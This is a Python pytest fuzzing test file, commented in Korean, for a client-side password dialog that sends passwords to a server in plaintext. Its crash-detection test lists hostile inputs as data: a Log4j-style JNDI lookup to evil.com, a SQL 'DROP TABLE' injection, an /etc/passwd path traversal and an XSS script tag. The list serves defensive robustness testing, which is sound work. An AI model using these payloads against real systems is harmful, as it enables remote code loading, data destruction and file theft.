"""
Client-Side Authentication System Fuzzing Tests
Tests for SR-05: 사용자 인증 시스템 (클라이언트 측)
- 16자 최대 길이 제한 (PasswordEdit->MaxLength = 16)
- Raw Connect 클릭 시 로그인 창 발생
- 클라이언트에서 평문 패스워드를 서버로 전송
- 서버 응답 "OK" 처리
- 실제 DisplayGUI.cpp 구현 기반
"""

import pytest
import random
import string
import time
import socket
import threading
from hypothesis import given, strategies as st, settings, example
from faker import Faker

fake = Faker()

class ClientAuthenticationFuzzer:
    """클라이언트 측 인증 시스템 퍼저 (실제 DisplayGUI.cpp 기반)"""
    
    def __init__(self):
        self.max_password_length = 16  # PasswordEdit->MaxLength = 16
        self.server_responses = {
            "OK": "Authentication successful",
            "FAIL": "Authentication failed", 
            "ERROR": "Server error",
            "TIMEOUT": "Connection timeout"
        }
    
    def validate_client_input(self, password):
        """클라이언트 측 입력 검증 (실제 GUI 제약사항)"""
        if password is None:
            return False, "Password cannot be None"
        
        if not isinstance(password, str):
            return False, "Password must be string"
        
        # 실제 코드: PasswordEdit->MaxLength = 16
        if len(password) > self.max_password_length:
            return False, f"Password exceeds maximum length of {self.max_password_length}"
        
        # GUI 입력 필드에서 처리할 수 없는 문자들
        if '\x00' in password:
            return False, "Null bytes not allowed in GUI input"
        
        # 일부 제어 문자들이 GUI에서 문제를 일으킬 수 있음
        control_chars = ['\x01', '\x02', '\x03', '\x04', '\x05', '\x06', '\x07', '\x08', 
                        '\x0e', '\x0f', '\x10', '\x11', '\x12', '\x13', '\x14', '\x15', 
                        '\x16', '\x17', '\x18', '\x19', '\x1a', '\x1b', '\x1c', '\x1d', '\x1e', '\x1f']
        
        for char in control_chars:
            if char in password:
                return False, f"Control character not allowed: {repr(char)}"
        
        return True, "Client validation passed"
    
    def simulate_password_dialog(self, password):
        """패스워드 다이얼로그 시뮬레이션"""
        # TPasswordForm* PasswordForm = new TPasswordForm(this);
        # PasswordForm->ShowModal();
        
        try:
            # 클라이언트 측 검증
            is_valid, message = self.validate_client_input(password)
            if not is_valid:
                return False, message, None
            
            # PasswordForm->Confirmed 상태 시뮬레이션
            if password == "":  # 사용자가 빈 패스워드로 OK 클릭
                return True, "Dialog confirmed", password
            
            return True, "Dialog confirmed", password
            
        except Exception as e:
            return False, f"Dialog error: {str(e)}", None
    
    def simulate_network_send(self, password):
        """네트워크 전송 시뮬레이션 (실제 코드 기반)"""
        # 실제 코드:
        # std::string passwordStr = PasswordForm->Password.c_str();
        # tempClient->Socket->Write(passwordStr.c_str());
        
        try:
            # 네트워크 전송 시 발생할 수 있는 인코딩 이슈 테스트
            password_bytes = password.encode('utf-8')
            
            # 전송 크기 제한 (일반적인 TCP 버퍼 크기)
            if len(password_bytes) > 8192:
                return False, "Password too large for network transmission"
            
            return True, "Network send successful"
            
        except UnicodeEncodeError as e:
            return False, f"Encoding error: {str(e)}"
        except Exception as e:
            return False, f"Network error: {str(e)}"
    
    def simulate_server_response(self, password, response_type="OK"):
        """서버 응답 시뮬레이션"""
        # 실제 코드:
        # AnsiString response = tempClient->Socket->ReadLn();
        # if (response == "OK") { ShowMessage("Correct password."); }
        
        if response_type not in self.server_responses:
            response_type = "ERROR"
        
        return response_type, self.server_responses[response_type]
    
    def full_authentication_flow(self, password, server_response="OK"):
        """전체 인증 플로우 시뮬레이션"""
        # 1. 패스워드 다이얼로그
        dialog_success, dialog_message, validated_password = self.simulate_password_dialog(password)
        if not dialog_success:
            return False, f"Dialog failed: {dialog_message}", None
        
        # 2. 네트워크 전송
        network_success, network_message = self.simulate_network_send(validated_password)
        if not network_success:
            return False, f"Network failed: {network_message}", None
        
        # 3. 서버 응답 처리
        response_code, response_message = self.simulate_server_response(validated_password, server_response)
        
        # 4. 클라이언트에서 응답 처리
        if response_code == "OK":
            return True, "Authentication successful", response_code
        else:
            return False, f"Server rejected: {response_message}", response_code

class TestClientAuthenticationFuzzing:
    """클라이언트 측 인증 시스템 퍼징 테스트"""
    
    def setup_method(self):
        """각 테스트별 설정"""
        self.fuzzer = ClientAuthenticationFuzzer()
    
    @given(st.integers(min_value=1, max_value=16))
    def test_valid_password_lengths_fuzzing(self, length):
        """유효한 패스워드 길이 퍼징 (1-16자)"""
        # 랜덤 문자들로 지정된 길이의 패스워드 생성
        password = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
        
        is_valid, message = self.fuzzer.validate_client_input(password)
        assert is_valid, f"Valid length password should pass: '{password}' ({len(password)} chars)"
    
    @given(st.integers(min_value=17, max_value=1000))
    def test_invalid_password_lengths_fuzzing(self, length):
        """무효한 패스워드 길이 퍼징 (17자 이상)"""
        # 랜덤 문자들로 지정된 길이의 패스워드 생성
        password = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
        
        is_valid, message = self.fuzzer.validate_client_input(password)
        assert not is_valid, f"Invalid length password should fail: '{password}' ({len(password)} chars)"
        assert "exceeds maximum length" in message
    
    @given(st.text(min_size=1, max_size=15))
    def test_null_byte_injection_fuzzing(self, base_text):
        """널 바이트 인젝션 퍼징"""
        # 다양한 위치에 널 바이트 삽입
        positions = [0, len(base_text)//3, len(base_text)//2, len(base_text)*2//3, len(base_text)]
        
        for pos in positions:
            if pos > len(base_text):
                continue
            # 널 바이트를 랜덤 위치에 삽입
            test_password = base_text[:pos] + '\x00' + base_text[pos:]
            
            if len(test_password) <= 16:
                is_valid, message = self.fuzzer.validate_client_input(test_password)
                assert not is_valid, f"Null byte password should fail: {repr(test_password)}"
                assert "null" in message.lower()
        
        # 여러 널 바이트 삽입
        multiple_null_password = base_text[:5] + '\x00' + base_text[5:10] + '\x00'
        if len(multiple_null_password) <= 16:
            is_valid, message = self.fuzzer.validate_client_input(multiple_null_password)
            assert not is_valid, f"Multiple null bytes should fail: {repr(multiple_null_password)}"
    
    @given(st.text(min_size=1, max_size=15))
    def test_control_character_fuzzing(self, base_text):
        """제어 문자 퍼징 - 랜덤 제어 문자 삽입"""
        # 차단해야 할 제어 문자들
        blocked_control_chars = ['\x01', '\x02', '\x03', '\x04', '\x05', '\x06', '\x07', '\x08', 
                               '\x0e', '\x0f', '\x10', '\x11', '\x12', '\x13', '\x14', '\x15', 
                               '\x16', '\x17', '\x18', '\x19', '\x1a', '\x1b', '\x1c', '\x1d', '\x1e', '\x1f']
        
        # 허용되는 제어 문자들
        allowed_control_chars = ['\x09', '\x0a', '\x0c', '\x0d']  # tab, LF, FF, CR
        
        # 차단해야 할 제어 문자로 테스트
        for control_char in blocked_control_chars:
            # 랜덤 위치에 제어 문자 삽입
            positions = [0, len(base_text)//2, len(base_text)]  # 시작, 중간, 끝
            for pos in positions:
                if pos > len(base_text):
                    continue
                test_password = base_text[:pos] + control_char + base_text[pos:]
                
                # 길이 제한 확인
                if len(test_password) <= 16:
                    is_valid, message = self.fuzzer.validate_client_input(test_password)
                    assert not is_valid, f"Control character password should fail: {repr(test_password)}"
        
        # 허용되는 제어 문자로 테스트 (base_text에 차단 문자가 없는 경우만)
        base_has_blocked_chars = any(c in base_text for c in blocked_control_chars) or '\x00' in base_text
        
        if not base_has_blocked_chars:
            for control_char in allowed_control_chars:
                test_password = base_text + control_char
                if len(test_password) <= 16:
                    is_valid, message = self.fuzzer.validate_client_input(test_password)
                    # 허용되는 제어 문자는 통과해야 함 (base_text가 깨끗한 경우만)
                    assert is_valid, f"Allowed control character should pass: {repr(test_password)}"
    
    def test_unicode_password_handling(self):
        """유니코드 패스워드 처리 테스트"""
        unicode_passwords = [
            "관리자",        # 한글 (3자)
            "admin🔐",      # 이모지 포함
            "café",         # 악센트 문자
            "Ñoño",         # 스페인어
            "测试",         # 중국어 (2자)
            "тест",         # 러시아어 (4자)
        ]
        
        for password in unicode_passwords:
            # 길이 제한 확인 (유니코드 문자 길이)
            if len(password) <= 16:
                is_valid, message = self.fuzzer.validate_client_input(password)
                assert is_valid, f"Valid unicode password should pass: '{password}'"
                
                # 네트워크 전송 테스트
                network_success, network_message = self.fuzzer.simulate_network_send(password)  
                assert network_success, f"Unicode password should be sendable: '{password}'"
    
    def test_empty_password_handling(self):
        """빈 패스워드 처리 테스트"""
        empty_passwords = [
            "",           # 완전 빈 문자열
            " ",          # 공백 하나
            "   ",        # 여러 공백
            "\t",         # 탭
            "\n",         # 개행
            "\r\n",       # Windows 개행
        ]
        
        for password in empty_passwords:
            dialog_success, dialog_message, validated_password = self.fuzzer.simulate_password_dialog(password)
            # 빈 패스워드도 다이얼로그에서는 허용될 수 있음 (서버에서 거부)
            if password == "":
                assert dialog_success, "Empty password should be allowed in dialog"
    
    def test_network_transmission_limits(self):
        """네트워크 전송 제한 테스트"""
        # 매우 긴 패스워드 (네트워크 한계 테스트)
        huge_passwords = [
            "A" * 1000,     # 1KB
            "A" * 10000,    # 10KB  
            "A" * 100000,   # 100KB
        ]
        
        for password in huge_passwords:
            # 클라이언트 검증은 16자에서 실패해야 함
            is_valid, message = self.fuzzer.validate_client_input(password)
            assert not is_valid, f"Huge password should fail client validation: {len(password)} chars"
    
    def test_full_authentication_flow(self):
        """전체 인증 플로우 테스트"""
        test_cases = [
            ("admin", "OK", True),          # 성공 케이스
            ("wrong", "OK", True),          # 클라이언트는 성공, 서버에서 결정
            ("admin", "FAIL", False),       # 서버 거부
            ("admin", "ERROR", False),      # 서버 오류
            ("", "OK", True),               # 빈 패스워드
            ("a" * 16, "OK", True),         # 최대 길이
        ]
        
        for password, server_response, expected_success in test_cases:
            success, message, response_code = self.fuzzer.full_authentication_flow(password, server_response)
            
            if expected_success:
                assert success or "Dialog failed" in message, f"Flow should succeed for: '{password}' with server '{server_response}'"
            else:
                if len(password) <= 16:  # 클라이언트 검증 통과하는 경우
                    assert not success, f"Flow should fail for: '{password}' with server '{server_response}'"
    
    @given(st.text(min_size=0, max_size=50))
    def test_random_password_fuzzing(self, random_password):
        """랜덤 패스워드 퍼징"""
        try:
            is_valid, message = self.fuzzer.validate_client_input(random_password)
            
            if len(random_password) <= 16 and '\x00' not in random_password:
                # 제어 문자 체크
                has_bad_control = any(
                    ord(c) < 32 and c not in ['\t', '\n', '\r', '\x0c'] 
                    for c in random_password
                )
                
                if not has_bad_control:
                    assert is_valid, f"Valid random password should pass: {repr(random_password)}"
                else:
                    assert not is_valid, f"Control character password should fail: {repr(random_password)}"
            else:
                assert not is_valid, f"Invalid random password should fail: {repr(random_password)}"
                
        except Exception as e:
            # 예외가 발생해도 시스템이 다운되면 안됨
            pass
    
    @given(
        st.text(alphabet=string.ascii_letters + string.digits, min_size=1, max_size=10),
        st.sampled_from(['\x00', '\x01', '\x02', '\x07', '\x08', '\x1b', '\x0a', '\x0d', '\x09', '\x0c']),
        st.integers(min_value=0, max_value=10),
        st.integers(min_value=0, max_value=5)
    )
    def test_advanced_injection_fuzzing(self, base_password, injection_char, injection_pos, repeat_count):
        """고급 인젝션 퍼징 - 다양한 문자를 다양한 위치에 삽입"""
        if injection_pos >= len(base_password):
            injection_pos = len(base_password) - 1 if len(base_password) > 0 else 0
            
        # 주입 문자를 여러 번 반복
        injection_string = injection_char * (repeat_count + 1)
        
        # 랜덤 위치에 주입
        test_password = base_password[:injection_pos] + injection_string + base_password[injection_pos:]
        
        # 전체 인증 플로우 테스트
        success, message, response_code = self.fuzzer.full_authentication_flow(test_password, "OK")
        
        # 길이 제한 확인
        if len(test_password) > 16:
            assert not success, f"Long password should fail: {repr(test_password)} ({len(test_password)} chars)"
        elif '\x00' in test_password:
            assert not success, f"Null byte password should fail: {repr(test_password)}"
        elif any(ord(c) < 32 and c not in ['\t', '\n', '\r', '\x0c'] for c in test_password):
            assert not success, f"Control character password should fail: {repr(test_password)}"
    
    @given(
        st.lists(st.text(min_size=1, max_size=5), min_size=1, max_size=4),
        st.lists(st.sampled_from(['\x00', '\x01', '\x02', '\x07', '\x08', '\x1b']), min_size=1, max_size=3)
    )
    def test_combined_attack_fuzzing(self, text_segments, injection_chars):
        """복합 공격 퍼징 - 여러 텍스트와 주입 문자 조합"""
        # 텍스트 세그먼트와 주입 문자를 번갈아가며 조합
        combined_password = ""
        for i, segment in enumerate(text_segments):
            combined_password += segment
            if i < len(injection_chars):
                combined_password += injection_chars[i]
        
        # 길이가 너무 길면 잘라내기
        test_password = combined_password[:20]  # 16자 이상으로 테스트
        
        success, message, response_code = self.fuzzer.full_authentication_flow(test_password, "OK")
        
        # 예상 결과 검증
        should_fail = (
            len(test_password) > 16 or 
            '\x00' in test_password or 
            any(ord(c) < 32 and c not in ['\t', '\n', '\r', '\x0c'] for c in test_password)
        )
        
        if should_fail:
            assert not success, f"Attack password should fail: {repr(test_password)}"
    
    def test_password_dialog_edge_cases(self):
        """패스워드 다이얼로그 엣지 케이스"""
        edge_cases = [
            None,                    # None 입력
            123,                     # 숫자 타입
            [],                      # 리스트 타입
            {"pass": "admin"},       # 딕셔너리 타입
        ]
        
        for case in edge_cases:
            dialog_success, dialog_message, validated_password = self.fuzzer.simulate_password_dialog(case)
            assert not dialog_success, f"Invalid input type should fail: {type(case)}"
    
    def test_concurrent_authentication_attempts(self):
        """동시 인증 시도 테스트"""
        results = []
        
        def auth_worker(password, delay=0):
            if delay:
                time.sleep(delay)
            result = self.fuzzer.full_authentication_flow(password, "OK")
            results.append((password, result))
        
        # 동시 인증 시도
        threads = []
        test_passwords = ["admin", "test1", "test2", "admin", "test3"]
        
        for i, password in enumerate(test_passwords):
            t = threading.Thread(target=auth_worker, args=(password, i * 0.01))
            threads.append(t)
            t.start()
        
        # 완료 대기
        for t in threads:
            t.join()
        
        # 결과 검증 - 모든 요청이 독립적으로 처리되어야 함
        assert len(results) == len(test_passwords), "All authentication attempts should complete"
        
        for password, (success, message, response_code) in results:
            # 클라이언트 측에서는 모든 유효한 입력이 처리되어야 함
            if len(password) <= 16:
                assert success or "Server rejected" in message, f"Valid password should be processed: '{password}'"

    def test_stress_fuzzing(self):
        """스트레스 퍼징 - 대량의 랜덤 테스트 케이스"""
        test_count = 1000  # 1000개의 랜덤 테스트 케이스
        failure_count = 0
        success_count = 0
        
        # 실패 케이스 분석을 위한 저장소
        failure_categories = {
            "length_exceeded": [],
            "null_byte": [],
            "control_chars": [],
            "network_errors": [],
            "validation_errors": [],
            "exceptions": [],
            "unexpected": []
        }
        
        success_samples = []  # 성공한 케이스 샘플
        
        for i in range(test_count):
            # 랜덤 패스워드 생성
            length = random.randint(0, 50)
            chars = string.ascii_letters + string.digits + string.punctuation
            
            # 가끔 특수한 문자들 포함
            if random.random() < 0.3:  # 30% 확률로 제어 문자 포함
                chars += '\x00\x01\x02\x07\x08\x1b\x0a\x0d\x09\x0c'
            
            if random.random() < 0.2:  # 20% 확률로 유니코드 포함
                chars += 'áéíóúñç한글中文'
            
            random_password = ''.join(random.choices(chars, k=length))
            
            try:
                success, message, response_code = self.fuzzer.full_authentication_flow(random_password, "OK")
                
                # 결과 분류 및 분석
                if success:
                    success_count += 1
                    if len(success_samples) < 10:  # 성공 샘플 10개만 저장
                        success_samples.append((random_password, message))
                else:
                    failure_count += 1
                    # 실패 원인별 분류
                    self._categorize_failure(random_password, message, failure_categories)
                    
            except Exception as e:
                # 예외 발생도 실패로 간주
                failure_count += 1
                failure_categories["exceptions"].append((random_password, str(e)))
        
        # 상세 분석 결과 출력
        self._print_detailed_fuzzing_results(
            test_count, success_count, failure_count, 
            failure_categories, success_samples
        )
        
        # 최소한 일부 테스트는 성공하고 일부는 실패해야 함
        assert success_count > 0, "Some valid passwords should succeed"
        assert failure_count > 0, "Some invalid passwords should fail"
    
    def _categorize_failure(self, password, message, categories):
        """실패 케이스를 원인별로 분류"""
        if "exceeds maximum length" in message:
            if len(categories["length_exceeded"]) < 5:
                categories["length_exceeded"].append((password, len(password), message))
        elif "null" in message.lower():
            if len(categories["null_byte"]) < 5:
                categories["null_byte"].append((password, message))
        elif "control character" in message.lower():
            if len(categories["control_chars"]) < 5:
                categories["control_chars"].append((password, message))
        elif "network" in message.lower():
            if len(categories["network_errors"]) < 5:
                categories["network_errors"].append((password, message))
        elif "validation" in message.lower():
            if len(categories["validation_errors"]) < 5:
                categories["validation_errors"].append((password, message))
        else:
            if len(categories["unexpected"]) < 5:
                categories["unexpected"].append((password, message))
    
    def _print_detailed_fuzzing_results(self, test_count, success_count, failure_count, 
                                       failure_categories, success_samples):
        """상세한 퍼징 결과 출력"""
        print(f"\n{'='*60}")
        print(f"🔍 상세 스트레스 퍼징 분석 결과")
        print(f"{'='*60}")
        print(f"총 테스트: {test_count}")
        print(f"✅ 성공: {success_count} ({success_count/test_count*100:.1f}%)")
        print(f"❌ 실패: {failure_count} ({failure_count/test_count*100:.1f}%)")
        
        print(f"\n📊 실패 원인별 분석:")
        for category, cases in failure_categories.items():
            if cases:
                print(f"\n🔸 {category.upper().replace('_', ' ')} ({len(cases)} cases shown):")
                for case in cases:
                    if category == "length_exceeded":
                        password, length, message = case
                        print(f"   - 길이 {length}: {repr(password[:20])}{'...' if len(password) > 20 else ''}")
                    else:
                        password, message = case[:2]
                        print(f"   - {repr(password[:30])}{'...' if len(password) > 30 else ''}")
                        print(f"     └─ {message}")
        
        print(f"\n✨ 성공 케이스 샘플:")
        for password, message in success_samples[:5]:
            print(f"   - {repr(password)} → {message}")
        
        print(f"\n🎯 퍼징 요약:")
        total_categorized = sum(len(cases) for cases in failure_categories.values())
        print(f"   - 분류된 실패 케이스: {total_categorized}")
        print(f"   - 평균 패스워드 길이: {sum(len(p) for p, _ in success_samples) / max(len(success_samples), 1):.1f}")
        print(f"{'='*60}")
    
    def test_mutation_fuzzing(self):
        """뮤테이션 퍼징 - 기본 패스워드를 변형해가며 테스트"""
        base_passwords = ["admin", "password", "test", "user", "123456"]
        mutation_count = 100
        
        mutation_results = {}
        
        for base_password in base_passwords:
            results = {
                "total": 0,
                "success": 0,
                "failures": [],
                "interesting_mutations": []
            }
            
            for i in range(mutation_count):
                # 다양한 뮤테이션 적용
                mutated = self._mutate_password(base_password)
                results["total"] += 1
                
                try:
                    success, message, response_code = self.fuzzer.full_authentication_flow(mutated, "OK")
                    
                    # 뮤테이션된 패스워드의 유효성 검증
                    expected_valid = (
                        len(mutated) <= 16 and 
                        '\x00' not in mutated and
                        not any(ord(c) < 32 and c not in ['\t', '\n', '\r', '\x0c'] for c in mutated)
                    )
                    
                    if success:
                        results["success"] += 1
                        # 흥미로운 성공 케이스 저장 (원본과 많이 다른 경우)
                        if len(results["interesting_mutations"]) < 3 and mutated != base_password:
                            results["interesting_mutations"].append((mutated, "SUCCESS", message))
                    else:
                        # 실패 케이스 저장 (처음 3개만)
                        if len(results["failures"]) < 3:
                            results["failures"].append((mutated, message))
                    
                    # 예상과 다른 결과인 경우 기록
                    if expected_valid and not success and "Server rejected" not in message:
                        if len(results["failures"]) < 5:
                            results["failures"].append((mutated, f"UNEXPECTED FAIL: {message}"))
                    elif not expected_valid and success:
                        if len(results["interesting_mutations"]) < 5:
                            results["interesting_mutations"].append((mutated, "UNEXPECTED SUCCESS", message))
                        
                except Exception as e:
                    # 예외 발생 기록
                    if len(results["failures"]) < 5:
                        results["failures"].append((mutated, f"EXCEPTION: {str(e)}"))
            
            mutation_results[base_password] = results
        
        # 뮤테이션 결과 출력
        self._print_mutation_results(mutation_results)
    
    def _print_mutation_results(self, mutation_results):
        """뮤테이션 퍼징 결과 출력"""
        print(f"\n{'='*60}")
        print(f"🧬 뮤테이션 퍼징 분석 결과")
        print(f"{'='*60}")
        
        for base_password, results in mutation_results.items():
            success_rate = results["success"] / results["total"] * 100
            print(f"\n🔹 기본 패스워드: '{base_password}'")
            print(f"   총 뮤테이션: {results['total']}")
            print(f"   성공: {results['success']} ({success_rate:.1f}%)")
            print(f"   실패: {results['total'] - results['success']}")
            
            if results["failures"]:
                print(f"   \n   ❌ 실패 사례:")
                for mutated, message in results["failures"]:
                    print(f"      - {repr(mutated[:40])}{'...' if len(mutated) > 40 else ''}")
                    print(f"        └─ {message}")
            
            if results["interesting_mutations"]:
                print(f"   \n   🎯 흥미로운 뮤테이션:")
                for mutated, result_type, message in results["interesting_mutations"]:
                    print(f"      - {repr(mutated[:40])}{'...' if len(mutated) > 40 else ''}")
                    print(f"        └─ {result_type}: {message}")
        
        print(f"{'='*60}")
    
    def _mutate_password(self, password):
        """패스워드 뮤테이션 함수"""
        mutations = [
            lambda p: p + random.choice('\x00\x01\x02\x07\x08'),  # 제어 문자 추가
            lambda p: random.choice('\x00\x01\x02') + p,          # 앞에 제어 문자 추가
            lambda p: p[:len(p)//2] + '\x00' + p[len(p)//2:],    # 중간에 널 바이트 삽입
            lambda p: p * random.randint(2, 5),                   # 반복으로 길이 늘리기
            lambda p: p + 'A' * random.randint(10, 30),          # 긴 문자열 추가
            lambda p: ''.join(reversed(p)),                       # 뒤집기
            lambda p: p.upper() if p.islower() else p.lower(),    # 대소문자 변경
            lambda p: p + random.choice('!@#$%^&*()'),          # 특수 문자 추가
            lambda p: chr(random.randint(0, 255)) + p,           # 랜덤 바이트 추가
            lambda p: p + chr(random.randint(128, 255)),         # 고위 ASCII 추가
        ]
        
        # 랜덤하게 뮤테이션 선택하여 적용
        mutation = random.choice(mutations)
        try:
            return mutation(password)
        except:
            return password  # 뮤테이션 실패시 원래 패스워드 리턴

    def test_crash_detection_fuzzing(self):
        """충돌 감지 퍼징 - 예외 및 예상치 못한 동작 탐지"""
        crash_test_cases = [
            # Type confusion attacks
            None, 123, [], {}, object(),
            
            # Extreme values
            "A" * 1000000,  # 매우 큰 문자열
            "\x00" * 1000,  # 널 바이트 폭탄
            chr(0xFFFF) * 100,  # 유니코드 최대값
            
            # Format string attacks
            "%s%s%s%s%s%s%s%s",
            "%x%x%x%x%x%x%x%x",
            "${jndi:ldap://evil.com/}",  # Log4j 스타일
            
            # Script injection attempts  
            "<script>alert(1)</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            
            # Buffer overflow attempts
            "A" * 65536,
            "\xFF" * 4096,
            
            # Encoding attacks
            "\xC0\x80",  # Invalid UTF-8
            "\xED\xA0\x80",  # UTF-8 surrogate
        ]
        
        crashes = []
        unexpected_successes = []
        
        print(f"\n🔍 충돌 감지 퍼징 시작 ({len(crash_test_cases)} 케이스)")
        
        for i, test_case in enumerate(crash_test_cases):
            try:
                print(f"   테스트 {i+1:2d}/{'%2d' % len(crash_test_cases)}: {type(test_case).__name__} {repr(test_case)[:30]}{'...' if len(repr(test_case)) > 30 else ''}")
                
                # 각 단계별로 크래시 감지
                success, message, response_code = self.fuzzer.full_authentication_flow(test_case, "OK")
                
                # 예상치 못한 성공 (타입이 잘못됐는데 성공한 경우)
                if success and not isinstance(test_case, str):
                    unexpected_successes.append((test_case, message))
                
                # 큰 문자열이 성공한 경우 (메모리 문제 가능성)
                if success and isinstance(test_case, str) and len(test_case) > 1000:
                    unexpected_successes.append((test_case, f"Large string succeeded: {len(test_case)} chars"))
                
            except MemoryError as e:
                crashes.append((test_case, f"MEMORY_ERROR: {str(e)}"))
            except RecursionError as e:
                crashes.append((test_case, f"RECURSION_ERROR: {str(e)}"))
            except UnicodeError as e:
                crashes.append((test_case, f"UNICODE_ERROR: {str(e)}"))
            except Exception as e:
                # 예상치 못한 예외
                if "Password must be string" not in str(e) and "Password cannot be None" not in str(e):
                    crashes.append((test_case, f"UNEXPECTED_EXCEPTION: {type(e).__name__}: {str(e)}"))
        
        # 결과 출력
        self._print_crash_results(crashes, unexpected_successes)
        
        # 심각한 크래시가 있으면 경고
        if crashes:
            print(f"\n⚠️  {len(crashes)}개의 충돌이 감지되었습니다!")
    
    def _print_crash_results(self, crashes, unexpected_successes):
        """충돌 감지 결과 출력"""
        print(f"\n{'='*60}")
        print(f"💥 충돌 감지 퍼징 결과")
        print(f"{'='*60}")
        
        if crashes:
            print(f"\n🚨 충돌 발생 ({len(crashes)}건):")
            for test_case, error in crashes:
                print(f"   - 입력: {repr(test_case)[:50]}{'...' if len(repr(test_case)) > 50 else ''}")
                print(f"     에러: {error}")
        else:
            print(f"\n✅ 충돌 없음 - 시스템이 안정적으로 모든 케이스를 처리했습니다.")
        
        if unexpected_successes:
            print(f"\n🤔 예상치 못한 성공 ({len(unexpected_successes)}건):")
            for test_case, message in unexpected_successes:
                print(f"   - 입력: {repr(test_case)[:50]}{'...' if len(repr(test_case)) > 50 else ''}")
                print(f"     결과: {message}")
        
        print(f"{'='*60}")

if __name__ == "__main__":
    pytest.main([__file__, "-v"]) 